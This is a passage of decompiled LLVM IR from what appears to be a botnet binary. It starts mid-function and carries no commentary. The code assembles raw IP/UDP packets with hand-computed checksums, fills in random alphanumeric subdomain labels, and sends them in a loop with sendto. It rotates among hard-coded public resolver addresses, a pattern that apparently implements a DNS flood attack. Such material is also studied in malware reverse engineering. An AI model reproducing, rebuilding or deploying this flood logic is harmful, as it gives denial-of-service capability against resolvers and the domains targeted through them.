  %v3_c604 = add i32 %v2_c604, 2
  %v4_c604 = inttoptr i32 %v3_c604 to i16*
  store i16 %v1_c604, i16* %v4_c604, align 2
  %v2_c60c = load i32, i32* %r1.global-to-local, align 4
  %v3_c60c = add i32 %v2_c60c, 20
  %v4_c60c = inttoptr i32 %v3_c60c to i16*
  store i16 %rev, i16* %v4_c60c, align 2
  store i32 %v4_c5dc, i32* %ip.global-to-local, align 4
  %v0_c614 = load i32, i32* %r1.global-to-local, align 4
  %v1_c614 = add i32 %v0_c614, 28
  store i32 %v1_c614, i32* %r0.global-to-local, align 4
  store i32 %v4_c618, i32* %r3.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v3_c624 = add i32 %v0_c614, 30
  %v4_c624 = inttoptr i32 %v3_c624 to i16*
  store i16 1, i16* %v4_c624, align 2
  %v0_c628 = load i32, i32* @lr, align 4
  %v1_c628 = trunc i32 %v0_c628 to i16
  %v2_c628 = load i32, i32* %r0.global-to-local, align 4
  %v3_c628 = add i32 %v2_c628, 4
  %v4_c628 = inttoptr i32 %v3_c628 to i16*
  store i16 %v1_c628, i16* %v4_c628, align 2
  %v0_c62c = load i32, i32* %ip.global-to-local, align 4
  %v1_c62c = trunc i32 %v0_c62c to i8
  %v2_c62c = load i32, i32* %r1.global-to-local, align 4
  %v3_c62c = add i32 %v2_c62c, 40
  %v4_c62c = inttoptr i32 %v3_c62c to i8*
  store i8 %v1_c62c, i8* %v4_c62c, align 1
  %v0_c630 = load i32, i32* @fp, align 4
  %v1_c630 = load i32, i32* %r1.global-to-local, align 4
  %v2_c630 = add i32 %v1_c630, 16
  %v3_c630 = inttoptr i32 %v2_c630 to i32*
  store i32 %v0_c630, i32* %v3_c630, align 4
  %v0_c634 = load i32, i32* %r3.global-to-local, align 4
  %v1_c634 = trunc i32 %v0_c634 to i16
  %v2_c634 = load i32, i32* %r1.global-to-local, align 4
  %v3_c634 = add i32 %v2_c634, 28
  %v4_c634 = inttoptr i32 %v3_c634 to i16*
  store i16 %v1_c634, i16* %v4_c634, align 2
  %v0_c638 = load i32, i32* @r4, align 4
  %v1_c638 = add i32 %v0_c638, 1
  store i32 %v1_c638, i32* %r0.global-to-local, align 4
  %v0_c63c = load i32, i32* @r7, align 4
  store i32 %v0_c63c, i32* %r1.global-to-local, align 4
  store i32 %v1_c554, i32* %r2.global-to-local, align 4
  %v3_c644 = call i32 @util_memcpy(i32 %v1_c638, i32 %v0_c63c, i32 %v1_c554)
  store i32 %v3_c644, i32* %r0.global-to-local, align 4
  %v0_c648 = load i32, i32* @r6, align 4
  %v2_c648 = icmp eq i32 %v0_c648, 0
  store i1 %v2_c648, i1* %cpsr_z.global-to-local, align 1
  %tmp116 = icmp slt i32 %v0_c648, 1
  br i1 %tmp116, label %bb117, label %dec_label_pc_c658

bb117:                                            ; preds = %.thread11
  %v5_c64c = load i32, i32* @r4, align 4
  store i32 %v5_c64c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_c690

dec_label_pc_c658:                                ; preds = %.thread11
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_c65c = load i32, i32* @r4, align 4
  store i32 %v0_c65c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_c664

dec_label_pc_c664:                                ; preds = %.thread18, %dec_label_pc_c658
  %v0_c670 = phi i32 [ %storemerge, %.thread18 ], [ 0, %dec_label_pc_c658 ]
  %v0_c674 = phi i32 [ %v0_c688, %.thread18 ], [ 0, %dec_label_pc_c658 ]
  %v1_c664 = load i32, i32* @r7, align 4
  %v2_c664 = add i32 %v1_c664, %v0_c674
  %v3_c664 = inttoptr i32 %v2_c664 to i8*
  %v4_c664 = load i8, i8* %v3_c664, align 1
  %v6_c664 = zext i8 %v4_c664 to i32
  store i32 %v6_c664, i32* %r3.global-to-local, align 4
  %v7_c668 = icmp eq i8 %v4_c664, 46
  store i1 %v7_c668, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c668, label %bb118, label %.thread60

.thread60:                                        ; preds = %dec_label_pc_c664
  %v1_c67014 = add nsw i32 %v0_c670, 1
  store i32 %v1_c67014, i32* %r2.global-to-local, align 4
  %v1_c67416 = add i32 %v0_c674, 1
  store i32 %v1_c67416, i32* %r1.global-to-local, align 4
  br label %bb119

bb118:                                            ; preds = %dec_label_pc_c664
  %v2_c66c = load i32, i32* @r4, align 4
  %v3_c66c = add i32 %v2_c66c, %v0_c674
  store i32 %v3_c66c, i32* %r3.global-to-local, align 4
  %v1_c670 = add nsw i32 %v0_c670, 1
  store i32 %v1_c670, i32* %r2.global-to-local, align 4
  %v1_c674 = add i32 %v0_c674, 1
  store i32 %v1_c674, i32* %r1.global-to-local, align 4
  %v2_c678 = trunc i32 %v0_c670 to i8
  %v3_c678 = load i32, i32* %r0.global-to-local, align 4
  %v4_c678 = inttoptr i32 %v3_c678 to i8*
  store i8 %v2_c678, i8* %v4_c678, align 1
  %v0_c67c.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c67c.pre, label %bb120, label %bb118.bb119_crit_edge

bb118.bb119_crit_edge:                            ; preds = %bb118
  %v1_c67c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb119

bb119:                                            ; preds = %bb118.bb119_crit_edge, %.thread60
  %v1_c67c = phi i32 [ %v1_c67c.pre, %bb118.bb119_crit_edge ], [ %v1_c67014, %.thread60 ]
  %v2_c67c = urem i32 %v1_c67c, 256
  br label %.thread18

bb120:                                            ; preds = %bb118
  %v1_c680 = load i32, i32* %r3.global-to-local, align 4
  %v2_c680 = add i32 %v1_c680, 1
  store i32 %v2_c680, i32* %r0.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb119, %bb120
  %storemerge = phi i32 [ %v2_c67c, %bb119 ], [ 0, %bb120 ]
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  %v0_c688 = load i32, i32* %r1.global-to-local, align 4
  %v1_c688 = load i32, i32* @r6, align 4
  %v9_c688 = icmp eq i32 %v0_c688, %v1_c688
  store i1 %v9_c688, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c688, label %dec_label_pc_c690.loopexit, label %dec_label_pc_c664

dec_label_pc_c690.loopexit:                       ; preds = %.thread18
  %v2_c690.pre = load i32, i32* %r0.global-to-local, align 4
  %extract.t131 = trunc i32 %storemerge to i8
  br label %dec_label_pc_c690

dec_label_pc_c690:                                ; preds = %bb117, %dec_label_pc_c690.loopexit
  %v0_c690.off0 = phi i8 [ %extract.t131, %dec_label_pc_c690.loopexit ], [ 0, %bb117 ]
  %v2_c690 = phi i32 [ %v2_c690.pre, %dec_label_pc_c690.loopexit ], [ %v5_c64c, %bb117 ]
  %v3_c690 = inttoptr i32 %v2_c690 to i8*
  store i8 %v0_c690.off0, i8* %v3_c690, align 1
  %v3_c694 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c694, i32* %r3.global-to-local, align 4
  %v1_c698 = add i32 %v3_c694, 1
  store i32 %v1_c698, i32* @r5, align 4
  %v0_c69c = load i32, i32* @r4, align 4
  %v1_c69c = load i32, i32* @r6, align 4
  %v2_c69c = add i32 %v1_c69c, %v0_c69c
  store i32 %v2_c69c, i32* %r2.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v0_c6a4 = load i32, i32* @r8, align 4
  %v9_c6a4 = icmp eq i32 %v0_c6a4, %v1_c698
  store i1 %v9_c6a4, i1* %cpsr_z.global-to-local, align 1
  %v3_c6a8 = add i32 %v2_c69c, 4
  %v4_c6a8 = inttoptr i32 %v3_c6a8 to i16*
  store i16 256, i16* %v4_c6a8, align 2
  %v0_c6ac = load i32, i32* @lr, align 4
  %v1_c6ac = trunc i32 %v0_c6ac to i16
  %v2_c6ac = load i32, i32* %r2.global-to-local, align 4
  %v3_c6ac = add i32 %v2_c6ac, 2
  %v4_c6ac = inttoptr i32 %v3_c6ac to i16*
  store i16 %v1_c6ac, i16* %v4_c6ac, align 2
  %v0_c6b0 = load i32, i32* @r5, align 4
  store i32 %v0_c6b0, i32* %stack_var_-44, align 4
  %v8_c6b4 = icmp sgt i32 %v0_c6a4, %v1_c698
  br i1 %v8_c6b4, label %dec_label_pc_c570, label %dec_label_pc_c6b8

dec_label_pc_c6b8:                                ; preds = %dec_label_pc_c690
  store i32 %v4_c5dc, i32* %r0.global-to-local, align 4
  %v0_c6bc = load i32, i32* @r6, align 4
  %v2_c6bc = add i32 %v0_c6bc, %v4_c5dc
  store i32 %v2_c6bc, i32* @r7, align 4
  %v0_c6c4.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_c6c0.preheader

dec_label_pc_c6c0.preheader:                      ; preds = %.dec_label_pc_c6c0.preheader_crit_edge, %dec_label_pc_c6b8
  %v4_c724.pre-phi = phi i32 [ %.pre, %.dec_label_pc_c6c0.preheader_crit_edge ], [ %v4_c5dc, %dec_label_pc_c6b8 ]
  %v0_c6c4.pre = phi i32 [ 0, %.dec_label_pc_c6c0.preheader_crit_edge ], [ %v0_c6c4.pre.pre, %dec_label_pc_c6b8 ]
  %v9_c6f0 = icmp eq i32 %v3_c494, ptrtoint (i16* @global_var_ffff.60 to i32)
  %v9_c700 = icmp eq i32 %v3_c49c, ptrtoint (i16* @global_var_ffff.60 to i32)
  br label %dec_label_pc_c6c0

dec_label_pc_c6c0:                                ; preds = %dec_label_pc_c6c0, %dec_label_pc_c7b8, %dec_label_pc_c6c0.preheader
  %v0_c6c4 = phi i32 [ %v0_c6c4.pre, %dec_label_pc_c6c0.preheader ], [ 0, %dec_label_pc_c7b8 ], [ 0, %dec_label_pc_c6c0 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c6c4 = icmp eq i32 %v0_c6c4, 0
  store i1 %v2_c6c4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c6c4, label %dec_label_pc_c6c0, label %dec_label_pc_c6d0

dec_label_pc_c6d0:                                ; preds = %dec_label_pc_c6c0, %dec_label_pc_c7b8
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_c6d4 = load i32, i32* @r7, align 4
  %v1_c6d4 = add i32 %v0_c6d4, 27
  store i32 %v1_c6d4, i32* @sb, align 4
  %v1_c6d8 = add i32 %v0_c6d4, 47
  store i32 %v1_c6d8, i32* @sl, align 4
  br label %dec_label_pc_c6dc

dec_label_pc_c6dc:                                ; preds = %dec_label_pc_c720, %dec_label_pc_c6d0
  %v1_c6e8 = phi i32 [ %v1_c7a8, %dec_label_pc_c720 ], [ 0, %dec_label_pc_c6d0 ]
  store i32 %v2_c1ec, i32* %r3.global-to-local, align 4
  store i32 %v3_c494, i32* %ip.global-to-local, align 4
  %v4_c6e8 = mul i32 %v1_c6e8, 4
  %v5_c6e8 = add i32 %v4_c6e8, %v2_c1ec
  %v6_c6e8 = inttoptr i32 %v5_c6e8 to i32*
  %v7_c6e8 = load i32, i32* %v6_c6e8, align 4
  store i32 %v7_c6e8, i32* @r4, align 4
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* @r5, align 4
  store i1 %v9_c6f0, i1* %cpsr_z.global-to-local, align 1
  %v1_c6f4 = add i32 %v7_c6e8, 20
  store i32 %v1_c6f4, i32* @r6, align 4
  br i1 %v9_c6f0, label %dec_label_pc_c7cc, label %dec_label_pc_c6fc

dec_label_pc_c6fc:                                ; preds = %dec_label_pc_c6dc
  store i32 %v3_c49c, i32* @lr, align 4
  store i1 %v9_c700, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c700, label %dec_label_pc_c7e0, label %dec_label_pc_c708

dec_label_pc_c708:                                ; preds = %dec_label_pc_c7cc.dec_label_pc_c708_crit_edge, %dec_label_pc_c6fc
  %v1_c70c = phi i32 [ %v1_c70c.pre, %dec_label_pc_c7cc.dec_label_pc_c708_crit_edge ], [ ptrtoint (i16* @global_var_ffff.60 to i32), %dec_label_pc_c6fc ]
  store i32 %v3_c4b8, i32* %r0.global-to-local, align 4
  %v9_c70c = icmp eq i32 %v3_c4b8, %v1_c70c
  store i1 %v9_c70c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c70c, label %dec_label_pc_c7f4, label %dec_label_pc_c714

dec_label_pc_c714:                                ; preds = %dec_label_pc_c7e0, %dec_label_pc_c708
  %v1_c718 = phi i32 [ %v1_c7ec, %dec_label_pc_c7e0 ], [ %v1_c70c, %dec_label_pc_c708 ]
  store i32 %v3_c4c0, i32* %r2.global-to-local, align 4
  %v9_c718 = icmp eq i32 %v3_c4c0, %v1_c718
  store i1 %v9_c718, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c718, label %dec_label_pc_c808, label %dec_label_pc_c720

dec_label_pc_c720:                                ; preds = %dec_label_pc_c7f4, %dec_label_pc_c714, %dec_label_pc_c808
  %v0_c720 = load i32, i32* @r4, align 4
  %v1_c720 = add i32 %v0_c720, 41
  store i32 %v1_c720, i32* %r0.global-to-local, align 4
  store i32 %v4_c724.pre-phi, i32* %r1.global-to-local, align 4
  %v2_c728 = call i32 @rand_alpha_str(i32 %v1_c720, i32 %v4_c724.pre-phi)
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c730 = load i32, i32* @r4, align 4
  %v3_c730 = add i32 %v2_c730, 10
  %v4_c730 = inttoptr i32 %v3_c730 to i16*
  store i16 0, i16* %v4_c730, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c738 = load i32, i32* @r4, align 4
  store i32 %v0_c738, i32* @r0, align 4
  %v2_c73c = call i32 @checksum_generic(i32 %v0_c738, i32 20)
  %v3_c73c = trunc i32 %v2_c73c to i16
  store i32 %v2_c73c, i32* %r0.global-to-local, align 4
  %v3_c740 = load i32, i32* @r4, align 4
  %v4_c740 = add i32 %v3_c740, 10
  %v5_c740 = inttoptr i32 %v4_c740 to i16*
  store i16 %v3_c73c, i16* %v5_c740, align 2
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_c748 = load i32, i32* @r6, align 4
  %v3_c748 = add i32 %v2_c748, 6
  %v4_c748 = inttoptr i32 %v3_c748 to i16*
  store i16 0, i16* %v4_c748, align 2
  %v0_c74c = load i32, i32* @r6, align 4
  store i32 %v0_c74c, i32* @r1, align 4
  %v1_c750 = add i32 %v0_c74c, 4
  %v2_c750 = inttoptr i32 %v1_c750 to i16*
  %v3_c750 = load i16, i16* %v2_c750, align 2
  %v4_c750 = zext i16 %v3_c750 to i32
  store i32 %v4_c750, i32* %r2.global-to-local, align 4
  %v0_c754 = load i32, i32* @sb, align 4
  store i32 %v0_c754, i32* %r3.global-to-local, align 4
  %v0_c758 = load i32, i32* @r4, align 4
  store i32 %v0_c758, i32* %r0.global-to-local, align 4
  %v4_c75c = call i32 @checksum_tcpudp(i32 %v0_c758, i32 %v0_c74c, i32 %v4_c750, i32 %v0_c754)
  %v5_c75c = trunc i32 %v4_c75c to i16
  store i32 %v4_c75c, i32* %r0.global-to-local, align 4
  %v3_c760 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c760, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @lr, align 4
  %v3_c768 = mul i32 %v3_c760, 32
  store i32 %v3_c768, i32* %ip.global-to-local, align 4
  %v3_c76c = load i32, i32* @r6, align 4
  %v4_c76c = add i32 %v3_c76c, 6
  %v5_c76c = inttoptr i32 %v4_c76c to i16*
  store i16 %v5_c75c, i16* %v5_c76c, align 2
  %v0_c770 = load i32, i32* %ip.global-to-local, align 4
  %v1_c770 = load i32, i32* %r3.global-to-local, align 4
  %tmp133 = mul i32 %v1_c770, -8
  %v5_c770 = add i32 %v0_c770, %tmp133
  store i32 %v5_c770, i32* %ip.global-to-local, align 4
  %v0_c774 = load i32, i32* @r6, align 4
  %v1_c774 = add i32 %v0_c774, 2
  %v2_c774 = inttoptr i32 %v1_c774 to i16*
  %v3_c774 = load i16, i16* %v2_c774, align 2
  %v4_c774 = zext i16 %v3_c774 to i32
  store i32 %v4_c774, i32* @r6, align 4
  %v1_c778 = load i32, i32* @lr, align 4
  %v2_c778 = add i32 %v1_c778, %v5_c770
  store i32 %v2_c778, i32* %ip.global-to-local, align 4
  %v3_c77c = add i32 %v2_c778, 2
  %v4_c77c = inttoptr i32 %v3_c77c to i16*
  store i16 %v3_c774, i16* %v4_c77c, align 2
  %v0_c780 = load i32, i32* @fp, align 4
  %v1_c780 = load i32, i32* %ip.global-to-local, align 4
  %v2_c780 = add i32 %v1_c780, 4
  %v3_c780 = inttoptr i32 %v2_c780 to i32*
  store i32 %v0_c780, i32* %v3_c780, align 4
  %v0_c784 = load i32, i32* @r4, align 4
  store i32 %v0_c784, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_c438, i32* %r0.global-to-local, align 4
  %v0_c790 = load i32, i32* @sl, align 4
  store i32 %v0_c790, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_c798 = load i32, i32* %ip.global-to-local, align 4
  %v6_c7a0 = call i32 @__libc_sendto(i32 %v3_c438, i32 %v0_c784, i32 %v0_c790, i32 16384, i32 %v0_c798, i32 16)
  %v3_c7a4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c7a4, i32* %r3.global-to-local, align 4
  %v1_c7a8 = add i32 %v3_c7a4, 1
  store i32 %v1_c7a8, i32* %r0.global-to-local, align 4
  %v0_c7ac = load i32, i32* @r8, align 4
  %v9_c7ac = icmp eq i32 %v0_c7ac, %v1_c7a8
  store i1 %v9_c7ac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c7a8, i32* %stack_var_-44, align 4
  %v8_c7b4 = icmp sgt i32 %v0_c7ac, %v1_c7a8
  br i1 %v8_c7b4, label %dec_label_pc_c6dc, label %dec_label_pc_c7b8

dec_label_pc_c7b8:                                ; preds = %dec_label_pc_c720
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c7bc = icmp eq i32 %v0_c7ac, 0
  store i1 %v2_c7bc, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c7bc, label %dec_label_pc_c6c0, label %dec_label_pc_c6d0

dec_label_pc_c7cc:                                ; preds = %dec_label_pc_c6dc
  %v0_c7cc = call i32 @rand_next()
  %v1_c7cc = trunc i32 %v0_c7cc to i16
  store i32 %v0_c7cc, i32* %r0.global-to-local, align 4
  store i32 %v3_c49c, i32* @lr, align 4
  %v1_c7d4 = load i32, i32* @r5, align 4
  %v9_c7d4 = icmp eq i32 %v3_c49c, %v1_c7d4
  store i1 %v9_c7d4, i1* %cpsr_z.global-to-local, align 1
  %v3_c7d8 = load i32, i32* @r4, align 4
  %v4_c7d8 = add i32 %v3_c7d8, 4
  %v5_c7d8 = inttoptr i32 %v4_c7d8 to i16*
  store i16 %v1_c7cc, i16* %v5_c7d8, align 2
  br i1 %v9_c7d4, label %dec_label_pc_c7e0, label %dec_label_pc_c7cc.dec_label_pc_c708_crit_edge

dec_label_pc_c7cc.dec_label_pc_c708_crit_edge:    ; preds = %dec_label_pc_c7cc
  %v1_c70c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_c708

dec_label_pc_c7e0:                                ; preds = %dec_label_pc_c7cc, %dec_label_pc_c6fc
  %v0_c7e0 = call i32 @rand_next()
  %v1_c7e0 = trunc i32 %v0_c7e0 to i16
  %v3_c7e4 = load i32, i32* @r4, align 4
  %v4_c7e4 = add i32 %v3_c7e4, 20
  %v5_c7e4 = inttoptr i32 %v4_c7e4 to i16*
  store i16 %v1_c7e0, i16* %v5_c7e4, align 2
  store i32 %v3_c4b8, i32* %r0.global-to-local, align 4
  %v1_c7ec = load i32, i32* @r5, align 4
  %v9_c7ec = icmp eq i32 %v3_c4b8, %v1_c7ec
  store i1 %v9_c7ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c7ec, label %dec_label_pc_c7f4, label %dec_label_pc_c714

dec_label_pc_c7f4:                                ; preds = %dec_label_pc_c7e0, %dec_label_pc_c708
  %v0_c7f4 = call i32 @rand_next()
  %v1_c7f4 = trunc i32 %v0_c7f4 to i16
  store i32 %v0_c7f4, i32* %r0.global-to-local, align 4
  store i32 %v3_c4c0, i32* %r2.global-to-local, align 4
  %v1_c7fc = load i32, i32* @r5, align 4
  %v9_c7fc = icmp eq i32 %v3_c4c0, %v1_c7fc
  store i1 %v9_c7fc, i1* %cpsr_z.global-to-local, align 1
  %v3_c800 = load i32, i32* @r6, align 4
  %v4_c800 = add i32 %v3_c800, 2
  %v5_c800 = inttoptr i32 %v4_c800 to i16*
  store i16 %v1_c7f4, i16* %v5_c800, align 2
  br i1 %v9_c7fc, label %dec_label_pc_c808, label %dec_label_pc_c720

dec_label_pc_c808:                                ; preds = %dec_label_pc_c7f4, %dec_label_pc_c714
  %v0_c808 = call i32 @rand_next()
  %v1_c808 = trunc i32 %v0_c808 to i16
  store i32 %v0_c808, i32* %r0.global-to-local, align 4
  %v3_c80c = load i32, i32* @r4, align 4
  %v4_c80c = add i32 %v3_c80c, 28
  %v5_c80c = inttoptr i32 %v4_c80c to i16*
  store i16 %v1_c808, i16* %v5_c80c, align 2
  br label %dec_label_pc_c720

dec_label_pc_c814:                                ; preds = %dec_label_pc_c39c, %dec_label_pc_c37c, %dec_label_pc_c320, %entry
  %v0_c814 = call i32 @rand_next()
  %v1_c818 = urem i32 %v0_c814, 4
  store i32 %v1_c818, i32* %r0.global-to-local, align 4
  %v2_c81c = icmp eq i32 %v1_c818, 3
  store i1 %v2_c81c, i1* %cpsr_z.global-to-local, align 1
  %trunc = trunc i32 %v0_c814 to i2
  switch i2 %trunc, label %dec_label_pc_c4189 [
    i2 0, label %dec_label_pc_c874
    i2 1, label %dec_label_pc_c86c
    i2 -2, label %dec_label_pc_c860
    i2 -1, label %dec_label_pc_c850
  ]

dec_label_pc_c838:                                ; preds = %dec_label_pc_c448
  store i32 %v3_c438, i32* %r0.global-to-local, align 4
  %v1_c83c = call i32 @__GI___libc_close(i32 %v3_c438)
  store i32 %v1_c83c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c840

dec_label_pc_c840:                                ; preds = %dec_label_pc_c420, %dec_label_pc_c418, %dec_label_pc_c838
  %v1_c84c = phi i32 [ %v3_c438, %dec_label_pc_c420 ], [ %v1_c84c50, %dec_label_pc_c418 ], [ %v1_c83c, %dec_label_pc_c838 ]
  store i32 %v18_c1cc, i32* %sb.global-to-local, align 4
  store i32 %v27_c1cc, i32* %lr.global-to-local, align 4
  ret i32 %v1_c84c

dec_label_pc_c850:                                ; preds = %dec_label_pc_c814
  store i32 33686020, i32* @fp, align 4
  br label %dec_label_pc_c418

dec_label_pc_c860:                                ; preds = %dec_label_pc_c814
  store i32 104859200, i32* @fp, align 4
  br label %dec_label_pc_c418

dec_label_pc_c86c:                                ; preds = %dec_label_pc_c814
  store i32 707416650, i32* @fp, align 4
  br label %dec_label_pc_c418

dec_label_pc_c874:                                ; preds = %dec_label_pc_c814
  store i32 134744072, i32* @fp, align 4
  br label %dec_label_pc_c418

; uselistorder directives
  uselistorder i32 %v1_c818, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_c814, { 1, 0 }
  uselistorder i32 %v0_c808, { 1, 0 }
  uselistorder i32 %v0_c7f4, { 1, 0 }
  uselistorder i32 %v1_c7ec, { 1, 0 }
  uselistorder i32 %v0_c7cc, { 1, 0 }
  uselistorder i32 %v1_c7a8, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_c770, { 1, 0 }
  uselistorder i32 %v4_c75c, { 1, 0 }
  uselistorder i32 %v2_c73c, { 1, 0 }
  uselistorder i32 %v4_c724.pre-phi, { 1, 0 }
  uselistorder i32 %v1_c698, { 1, 0, 2 }
  uselistorder i32 %v0_c688, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %v0_c674, { 2, 0, 3, 1 }
  uselistorder i32 %v0_c670, { 1, 0, 2 }
  uselistorder i32 %v0_c5e0, { 1, 0 }
  uselistorder i32 %v4_c5dc, { 2, 0, 3, 4, 1 }
  uselistorder i32 %tmp112, { 1, 0 }
  uselistorder i32 %v3_c528, { 1, 0 }
  uselistorder i32 %v3_c4e4, { 1, 0 }
  uselistorder i32 %v1_c4d8, { 2, 0, 1 }
  uselistorder i32 %v3_c4a4, { 1, 0 }
  uselistorder i32 %v3_c49c, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v3_c494, { 1, 0, 2 }
  uselistorder i8 %v5_c48c, { 1, 0, 2 }
  uselistorder i32 %v1_c478, { 1, 0 }
  uselistorder i32 %v0_c478, { 1, 0 }
  uselistorder i1 %v7_c468, { 1, 0 }
  uselistorder i1 %v7_c43c, { 1, 0 }
  uselistorder i32 %v3_c438, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v0_c418, { 1, 0, 2 }
  uselistorder i32 %v2_c3e8, { 0, 1, 3, 2 }
  uselistorder i32 %v2_c3e4, { 1, 0, 2 }
  uselistorder i1 %v7_c3d0, { 1, 0 }
  uselistorder i32 %v1_c3cc, { 1, 0, 2 }
  uselistorder i1 %v8_c3c4, { 1, 0 }
  uselistorder i1 %v7_c3c0, { 1, 0 }
  uselistorder i32 %v1_c3b4, { 1, 0 }
  uselistorder i8 %v2_c3a8, { 2, 0, 1, 3 }
  uselistorder i32 %v0_c3ac, { 1, 0 }
  uselistorder i32 %v0_c3cc, { 3, 0, 2, 1 }
  uselistorder i32 %v0_c39c, { 0, 2, 1 }
  uselistorder i32 %v1_c3b0, { 0, 2, 1 }
  uselistorder i32 %v2_c384, { 1, 0, 2, 3 }
  uselistorder i32 %v0_c37c, { 1, 0, 2, 3 }
  uselistorder i1 %v7_c374, { 1, 0 }
  uselistorder i32 %v0_c374, { 2, 3, 4, 1, 6, 5, 0 }
  uselistorder i32 %v0_c318, { 1, 0, 3, 2 }
  uselistorder i32 %v7_c2b8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v6_c29c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v7_c284, { 2, 1, 0, 3 }
  uselistorder i32 %v1_c26c, { 1, 2, 0 }
  uselistorder i32 %v5_c260, { 0, 2, 1 }
  uselistorder i32 %v8_c228, { 1, 0, 2, 3 }
  uselistorder i32 %v6_c228, { 0, 2, 1 }
  uselistorder i32 %v2_c1ec, { 0, 3, 1, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 1, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 34, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 33, 36, 35, 37, 39, 38, 41, 40, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 4, 6, 5, 8, 7, 9, 11, 10, 12, 13, 14, 16, 15, 19, 17, 18, 20, 21, 26, 22, 23, 24, 25, 30, 27, 28, 29, 31, 33, 32, 34, 35, 36, 37, 39, 38, 40, 41, 42, 43, 44, 46, 45, 48, 47, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 24, 26, 27, 28, 25, 22, 29, 30, 31 }
  uselistorder i16 64, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 41, { 2, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @inet_addr, { 1, 0 }
  uselistorder i32 sext (i16 ptrtoint (i16* @global_var_ffff.60 to i16) to i32), { 27, 0, 1, 2, 3, 4, 5, 6, 28, 7, 8, 9, 10, 11, 29, 12, 13, 14, 15, 16, 17, 18, 19, 30, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32 ptrtoint (i16* @global_var_ffff.60 to i32), { 0, 70, 1, 10, 69, 68, 67, 2, 66, 3, 65, 64, 63, 4, 62, 11, 61, 60, 59, 58, 12, 57, 56, 6, 55, 5, 13, 54, 53, 52, 51, 50, 7, 49, 14, 48, 47, 46, 45, 44, 15, 43, 16, 42, 41, 40, 17, 39, 18, 38, 37, 36, 35, 19, 34, 20, 33, 8, 21, 32, 31, 30, 29, 22, 28, 9, 23, 27, 26, 25, 24 }
